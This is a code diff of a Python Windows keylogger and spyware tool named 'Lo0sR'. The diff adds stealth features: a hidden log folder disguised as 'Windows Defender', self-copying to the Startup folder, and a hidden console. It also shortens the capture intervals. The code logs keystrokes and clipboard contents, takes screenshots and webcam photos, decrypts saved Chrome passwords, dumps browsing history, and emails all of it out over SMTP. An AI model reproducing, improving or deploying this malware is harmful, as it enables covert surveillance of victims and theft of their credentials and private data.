@@ -6,6 +6,7 @@ import shutil
 import pyHook
 import smtplib
 import sqlite3
+import win32con
 import win32api
 import win32gui
 import mimetypes
@@ -17,7 +18,7 @@ from os import getenv
 from Queue import Queue
 from PIL import ImageGrab
 from threading import Thread
-from VideoCapture import Device
+from SimpleCV import Camera, Image
 from email.utils import formatdate
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
@@ -34,49 +35,56 @@ PROCNAME = "chrome.exe"
 
 
 # KEYLOGGER CONFIG
-# output file name
-f_name = "output.txt"
+# Output Config
+path_to_files = "C:\\Users\\" + win32api.GetUserName() + "\\Documents\\Windows Defender\\"
+file_name = path_to_files + "log.txt"
 
 
 # CAMERA CONFIG
 
 # Screenshot
 # interval in sec
-interval = 120
+interval = 20
 
 # WebCam
 # interval in sec
-interval_webcam = 120
+interval_webcam = 20
 
 
 # MAIL CONFIG
-files = ["output.txt", ]
+files = [path_to_files + "log.txt", ]
 
 FromConf = 'your_email@gmail.com'
 ToConf = 'your_email@gmail.com'
 passwordConf = 'your_password'
 
-intervalMail = 600
+intervalMail = 40
 
 
-# Hides Window
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
 hide()
 
 
-# Adds Keylogger to Startup
-def add_to_autostart():
+def add_to_startup():
     path = "C:\\Users\\" + win32api.GetUserName() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    if os.path.isfile(path + "\Lo0sR.py") == True:  # checks if File already exists in Startup
+    if os.path.isfile(path + "\\Lo0sR.py") == True:
         pass
     else:
-        shutil.move(os.getcwd() + "\\Lo0sR.py", path)  # Moves File to Startup
-add_to_autostart()
+        shutil.copy(os.getcwd() + "\\Lo0sR.py", path)
+add_to_startup()
 
 
-# Kills Chrome if running
+def create_hidden_folder():
+    if os.path.exists(path_to_files):
+        pass
+    else:
+        os.makedirs(path_to_files)
+        win32api.SetFileAttributes(path_to_files, win32con.FILE_ATTRIBUTE_HIDDEN)
+create_hidden_folder()
+
+
 def kill_chrome():
     for proc in psutil.process_iter():
         try:
@@ -91,46 +99,49 @@ def keydown(event):
     global data
     if event.Ascii == 13:
             keys = '  <ENTER>'
-            fp = open(f_name, 'a')
+            fp = open(file_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 8:
             keys = '  <BACKSPACE>'
-            fp = open(f_name, 'a')
+            fp = open(file_name, 'a')
             data = keys
             fp.write(data + '\n')
             fp.close()
     elif event.Ascii == 9:
             keys = '  <TAB>'
-            fp = open(f_name, 'a')
+            fp = open(file_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 27:
             keys = '  <ESC>'
-            fp = open(f_name, 'a')
+            fp = open(file_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 32:
             keys = '  <SPACE>  '
-            fp = open(f_name, 'a')
+            fp = open(file_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 0:
         win32clipboard.OpenClipboard()
-        data = win32clipboard.GetClipboardData()
+        try:
+            data = win32clipboard.GetClipboardData()
+        except TypeError:
+            pass
         win32clipboard.CloseClipboard()
-        fp = open(f_name, 'a')
+        fp = open(file_name, 'a')
         fp.write(data + "\n")
         fp.close()
     elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
             pass
     else:
             keys = chr(event.Ascii)
-            fp = open(f_name, 'a')
+            fp = open(path_to_files + file_name, 'a')
             data = keys
             fp.write(data)
             fp.close()
@@ -144,58 +155,52 @@ def keylogger():
     pythoncom.PumpMessages()
 
 
-# Take Photo through webcam
 def webcam_pic(interval_w):
-
     try:
-        cam = Device()
+        cam = Camera()
         while True:
             time.sleep(interval_w)
             cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
-            scr = "webcam_" + cur_time + ".jpg"
+            scr = path_to_files + "webcam_" + cur_time + ".jpg"
             files.append(str(scr))
-            cam.saveSnapshot(scr)
+            img = cam.getImage()
+            img.save(scr)
     except Exception as e:
-        pass
+        print e
 
 
-# Take Screenshot
 def screenshot(interval_scr):
     while True:
-        time.sleep(interval_scr)
-        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
-        scr = "screenshot_" + cur_time + ".png"
-        files.append(str(scr))
-        ImageGrab.grab().save(scr, "PNG")
+        try:
+            time.sleep(interval_scr)
+            cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
+            scr = path_to_files + "screenshot_" + cur_time + ".png"
+            files.append(str(scr))
+            ImageGrab.grab().save(scr, "PNG")
+        except Exception as e:
+            print e
 
 
-# Send Mail
-def send_mail(From, To, password, intervalM):
-
+def send_mail(From, to, password, interval_mail):
     while True:
-
-        time.sleep(intervalM)
+        time.sleep(interval_mail)
         msg = MIMEMultipart()
         msg['From'] = From
-        msg['To'] = To
+        msg['To'] = to
         msg['Date'] = formatdate(localtime=True)
         msg['Subject'] = 'Lo0sR-Keylogger'
-
         msg.attach(MIMEText('Output'))
-
         try:
             smtp = smtplib.SMTP('smtp.gmail.com:587')
             smtp.starttls()
             smtp.login(From, password)
         except:
             login = 'failed'
-            print login
         else:
             login = 'success'
-            print login
-
         if login == 'success':
             for f in files:
+                f = f
                 ctype, encoding = mimetypes.guess_type(f)
                 if ctype is None or encoding is not None:
                     # No guess could be made, or the file is encoded (compressed), so
@@ -219,9 +224,9 @@ def send_mail(From, To, password, intervalM):
                 part.add_header('Content-Disposition', 'attachment; filename="%s"' % f)
                 msg.attach(part)
             try:
-                smtp.sendmail(From, To, msg.as_string())
-                open(f_name, 'w').close()
-                with open(f_name, 'w') as fl:
+                smtp.sendmail(From, to, msg.as_string())
+                open(file_name, 'w').close()
+                with open(file_name, 'w') as fl:
                     fl.write('### Keylogger - Log ###\n')
                     fl.close()
                 dump_chrome_passwords()
@@ -230,12 +235,11 @@ def send_mail(From, To, password, intervalM):
                 del files[:]
                 files.append("output.txt")
                 smtp.close()
-            except:
-                print 'fail'
+            except Exception:
+                pass
                 smtp.close()
         else:
             smtp.close()
-            print 'fail'
 
 
 """
@@ -250,50 +254,41 @@ Output:
 
 
 def dump_chrome_passwords():
-
-    try:
-        conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
-        cursor = conn.cursor()
-
-        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-        with open(f_name, 'a') as f:
-            f.write('\n\n\n### Chrome Passwords ###\n\n\n')
-            f.close()
-        for result in cursor.fetchall():
-            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-            if password:
-                site = 'Site: ' + result[0]
-                username = 'Username: ' + result[1]
-                password = 'Password: ' + password
-                with open(f_name, 'a') as f:
-                    f.write(site + '\n' + username + '\n' + password + '\n\n')
-                    f.close()
-        with open(f_name, 'a') as f:
-            f.write('\n\n### END ###\n\n\n')
-            f.close()
-    except Exception:
-        pass
+    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
+    cursor = conn.cursor()
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    with open(file_name, 'a') as f:
+        f.write('\n\n\n### All Chrome Passwords ###\n\n\n')
+        f.close()
+    for result in cursor.fetchall():
+        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+        if password:
+            site = 'Site: ' + result[0]
+            username = 'Username: ' + result[1]
+            password = 'Password: ' + password
+            with open(file_name, 'a') as f:
+                f.write(site + '\n' + username + '\n' + password + '\n\n')
+                f.close()
+    with open(file_name, 'a') as f:
+        f.write('\n\n### END ###\n\n\n')
+        f.close()
 
 
-# Dumps chrome history
 def dump_chrome_history():
-    try:
-        connection = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
-        connection.text_factory = str
-        cur = connection.cursor()
-        output_file = open('chrome_history.csv', 'wb')
-        csv_writer = csv.writer(output_file)
-        headers = ('URL', 'Title', 'Visit Count', 'Date (GMT)')
-        csv_writer.writerow(headers)
-        epoch = datetime(1601, 1, 1)
-        for row in (cur.execute('select url, title, visit_count, last_visit_time from urls')):
-            row = list(row)
-            url_time = epoch + timedelta(microseconds=row[3])
-            row[3] = url_time
-            csv_writer.writerow(row)
-        files.append("chrome_history.csv")
-    except Exception as e:
-        pass
+    connection = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
+    connection.text_factory = str
+    cur = connection.cursor()
+    output_file = open(path_to_files + 'chrome_history.csv', 'wb')
+    csv_writer = csv.writer(output_file)
+    headers = ('URL', 'Title', 'Visit Count', 'Date (GMT)')
+    csv_writer.writerow(headers)
+    epoch = datetime(1601, 1, 1)
+    for row in (cur.execute('select url, title, visit_count, last_visit_time from urls')):
+        row = list(row)
+        url_time = epoch + timedelta(microseconds=row[3])
+        row[3] = url_time
+        csv_writer.writerow(row)
+    files.append(path_to_files + "chrome_history.csv")
 
 
 def create_workers():
@@ -304,7 +299,6 @@ def create_workers():
 
 
 def work():
-
     x = queue.get()
     if x == 1:
         keylogger()
